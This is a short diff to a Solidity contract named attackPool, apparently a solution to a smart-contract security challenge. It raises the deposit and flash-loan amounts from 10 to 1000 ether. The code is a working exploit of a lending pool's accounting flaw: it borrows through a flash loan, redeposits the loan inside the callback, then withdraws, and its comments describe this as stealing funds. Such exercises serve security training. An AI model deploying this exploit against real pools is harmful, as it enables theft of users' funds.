@@ -12,14 +12,14 @@ contract attackPool {
 
     function execute() external payable {
         // deposit in pool
-        pool.deposit{value: 10 ether}();
+        pool.deposit{value: 1000 ether}();
     }
 
     // call flashloan and steal funds
     function attack() external payable {
         // flash loan will call to execute
         // from execute it will return balance 
-        pool.flashLoan(10 ether);
+        pool.flashLoan(1000 ether);
 
         // internal accounting will think we deposited 1000 ether
         pool.withdraw();
